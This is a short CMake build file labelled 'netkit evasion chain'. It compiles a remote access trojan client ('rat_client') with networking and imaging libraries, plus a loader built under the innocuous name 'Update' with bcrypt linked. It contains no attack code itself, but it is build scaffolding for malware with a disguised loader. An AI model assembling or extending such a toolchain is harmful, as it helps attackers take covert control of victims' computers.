# netkit evasion chain build
cmake_minimum_required(VERSION 3.16)
project(netkit_evasion CXX)

set(CMAKE_MSVC_RUNTIME_LIBRARY "MultiThreaded$<$<CONFIG:Debug>:Debug>")
set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

add_executable(rat_client WIN32 rat_client.cpp)
target_link_libraries(rat_client ws2_32 windowscodecs ole32)
target_compile_options(rat_client PRIVATE /O2 /W4 /permissive-)

add_executable(Update WIN32 loader.cpp)
target_link_libraries(Update bcrypt)
target_compile_options(Update PRIVATE /O2 /W4 /permissive-)
